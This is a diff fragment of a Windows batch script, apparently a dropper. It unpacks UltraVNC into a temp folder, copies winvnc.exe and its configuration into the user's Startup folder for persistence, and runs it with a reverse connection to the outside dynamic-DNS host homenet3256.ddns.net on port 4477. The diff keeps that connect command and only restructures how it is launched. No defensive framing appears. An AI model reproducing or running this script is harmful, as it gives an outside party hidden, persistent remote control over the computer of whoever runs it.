@@ -42,7 +42,9 @@ Call :UnZipFile "%temp%\downloadaccessalex\" "%temp%\downloadaccessalex\UltraVNC
 del "%temp%\downloadaccessalex\UltraVNC.zip"
 copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\UltraVNC.ini" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\winvnc.exe" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-start /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" winvnc.exe -connect homenet3256.ddns.net::4477
+start /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" winvnc.exe
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+start winvnc.exe -connect homenet3256.ddns.net::4477
 exit /b
 
 :UnZipFile <ExtractTo> <newzipfile>
